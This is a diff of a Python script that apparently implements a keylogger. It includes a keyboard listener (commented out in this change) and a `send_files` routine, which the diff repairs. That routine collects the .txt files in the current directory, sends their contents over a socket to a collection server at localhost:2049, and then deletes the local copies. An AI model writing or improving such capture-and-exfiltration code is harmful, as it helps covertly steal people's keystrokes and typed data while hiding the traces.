@@ -122,10 +122,11 @@ def send_files():
     global liste, socket
 
     # Lists all the .txt files in the directory
-    liste = os.listdir(".")
-    for i in range(len(liste)):
-        if liste[i].find(".txt") == -1:
-            del liste[i]
+    temp_liste = os.listdir(".")
+    liste = []
+    for file in temp_liste:
+        if file.find(".txt") != -1:
+            liste.append(file)
     socket.connect(("localhost", 2049))
 
     # For every .txt file
@@ -138,7 +139,7 @@ def send_files():
                 text_lines.append(line)
 
         # Send the name of the file
-        socket.send(("DESC "+line+"\n").encode("latin1"))
+        socket.send(("DESC "+text_file+"\n").encode("latin1"))
 
         # Sends each lines registered in text_lines
         for line in text_lines:
@@ -147,6 +148,8 @@ def send_files():
         # Save that file and goes to the next one
         socket.send("STOCK\n".encode("latin1"))
         os.remove(text_file)
+
+    # Closes the socket
     socket.send("END\n".encode("latin1"))
     socket.close()
 
@@ -161,9 +164,10 @@ def send_list():
     socket.close()
 
 
+"""
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+"""
 
-liste = ["aas", "aas", "bbs"]
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-send_list()
+send_files()
